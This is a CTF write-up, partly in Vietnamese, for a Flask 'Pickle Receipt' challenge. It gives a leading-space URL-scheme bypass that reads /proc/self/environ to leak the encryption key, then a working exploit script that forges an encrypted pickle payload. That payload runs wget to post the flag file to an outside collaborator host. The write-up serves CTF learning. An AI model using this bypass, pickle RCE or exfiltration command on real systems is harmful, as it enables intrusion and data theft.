# Pickle Receipt - CTF Write-up

## Challenge Overview

App Flask encrypt và serialize user data bằng pickle. Challenge yêu cầu exploit RCE và lấy flag.

## Challenge Analysis

### Architecture Review

**Docker Environment (`docker-compose.yml`)**

```yaml
environment:
  - APP_ENCRYPTION_KEY=${APP_ENCRYPTION_KEY:?APP_ENCRYPTION_KEY is required}
```

- Key được lưu trong biến môi trường
- Đọc `/proc/self/environ` để lấy key

**Flag Protection (`Dockerfile`)**

```python
dst = f"/flag_{secrets.token_hex(6)}.txt"
os.rename(src, dst)
```

- Flag được đặt tên với 12 kí tự random
- Lưu tại `/flag_<random>.txt`
- Tránh bruteforce

**Key Generation (`randomize.sh`)**

```bash
APP_ENCRYPTION_KEY=$(openssl rand -base64 32 | tr '+/' '-_' | tr -d '\n')
FLAG_VALUE="flag{$(cat /proc/sys/kernel/random/uuid)}"
```

- 32-byte base64 key

### Application Flow

**Endpoint 1: `/submit` (Recipe Creation)**

```python
recipe = {
    'recipe_name': recipe_name,
    'ingredients': ingredients,
    'secret_ingredient': secret_ingredient
}
serialized_recipe = pickle.dumps(recipe)
encrypted_recipe = encrypt_data(serialized_recipe)
```

- Nhận 3 fields
- Serializes data với pickle
- Encrypts với Fernet (symmetric encryption)

**Endpoint 2: `/view` (Recipe Viewing)**

```python
if recipe_url:
    if not is_url_scheme_allowed(recipe_url):
        return "URL scheme not allowed", 400
    with urllib.request.urlopen(recipe_url) as response:
        encrypted_recipe = response.read().decode('utf-8').strip()

serialized_recipe = decrypt_data(encrypted_recipe, None)
recipe = pickle.loads(serialized_recipe)  #VULNERABLE
```

- Lấy encrypted data từ input user hoặc URL
- URL scheme validation để block file hoặc ftp protocol
- Deserializes sau khi decryption

## Vulnerability Discovery

### 1. Insecure Deserialization (Primary Vulnerability)

Dòng `pickle.loads(serialized_recipe)` cho thấy app có lổ hổng. Python pickle module có thể execute code trong lúc deserialize bằng method `__reduce__`.

**Initial thought process:**

- Thấy `pickle.loads()` nghĩ tới insecure deserialization
- Cần encryption key để forge payloads

### 2. URL Scheme Filter Bypass

**Security Check (`security.py`):**

```python
def is_url_scheme_allowed(url):
    parsed = urlparse(url)
    scheme = parsed.scheme.lower()
    return scheme not in {'file', 'ftp'}
```

Filter blocks `file://` và `ftp://` scheme, `urllib.parse.urlparse()` bị lổ hổng thêm leading whitespace.

**Bypass Payload:**

```
+file:/proc/self/environ
```

**Validation Flow:**

```
Input: " file:/proc/self/environ"
       ↓
urlparse(" file:/proc/self/environ")
       ↓ (strips whitespace)
scheme = "" (empty) → PASS ✓
       ↓
urlopen(" file:/proc/self/environ")
       ↓ (does NOT strip)
Opens: file:/proc/self/environ → SUCCESS
```

## Exploitation Strategy

### Step 1: Extract Encryption Key

**Objective:** Dùng `/proc/self/environ` để lấy `APP_ENCRYPTION_KEY`

**Request to `/view`:**

```http
POST /view HTTP/1.1
Host: target:9001
Content-Type: application/x-www-form-urlencoded

url=+file:/proc/self/environ
```

**Response Analysis:**
Server trả environment variables:

```
APP_ENCRYPTION_KEY=E-LfaRyL541TMZPAO1wJ5x4eVMkp7oRoJxqEZAoSsVs=
```

### Step 2: Craft Malicious Pickle Payload

**Exploit Script (`exploit.py`):**

```python
#!/usr/bin/env python3
import pickle
import os
from cryptography.fernet import Fernet

def generate_payload(encryption_key, exfiltration_url):
    class RCE:
        def __reduce__(self):
            # Path traversal: /app working dir → /flag_*.txt at root
            cmd = f'wget --no-check-certificate --post-data="$(cat ../../../flag_*.txt)" {exfiltration_url}'
            return (os.system, (cmd,))

    # Serialize malicious object
    malicious_object = RCE()
    serialized = pickle.dumps(malicious_object)

    # Encrypt with stolen key
    cipher = Fernet(encryption_key.encode('utf-8'))
    encrypted = cipher.encrypt(serialized)

    return encrypted

if __name__ == "__main__":
    # Configuration
    ENCRYPTION_KEY = "E-LfaRyL541TMZPAO1wJ5x4eVMkp7oRoJxqEZAoSsVs="
    EXFIL_URL = "http://4fkn4i0xy48ftt20r0090cbomfs6gw4l.oastify.com"

    # Generate payload
    payload = generate_payload(ENCRYPTION_KEY, EXFIL_URL)

    # Output
    print("[+] Encrypted Payload Generated:")
    print(payload.decode('utf-8'))
    print("\n[+] Submit this payload to /view endpoint's 'encrypted_data' parameter")
```

**Dùng `wget` thay vì `curl`?**

- `curl` không được install
- Ban đầu em dùng `curl` bị "command not found"

### Step 3: Trigger Remote Code Execution

**Request tới `/view`:**

```http
POST /view HTTP/1.1
Host: target:9001
Content-Type: application/x-www-form-urlencoded

encrypted_data=gAAAAABm8x...
```

**Execution Flow:**

```
1. Server nhận encrypted payload
2. decrypt_data() dùng APP_ENCRYPTION_KEY từ environment
3. pickle.loads(decrypted_data) trigger
4. Python gọi đến RCE.__reduce__()
5. Trả về (os.system, (cmd,))
6. os.system() execute wget
7. Flag gửi về Burp Collaborator
```

### Step 4: Capture Flag

**Burp Collaborator HTTP Log:**

```http
POST / HTTP/1.1
Host: 4fkn4i0xy48ftt20r0090cbomfs6gw4l.oastify.com
User-Agent: Wget/1.21.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

flag{550e8400-e29b-41d4-a716-446655440000}
```

## References

- [Vicarius Blog: URL Blacklist Bypass](https://www.vicarius.io/vsociety/posts/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-4)

---
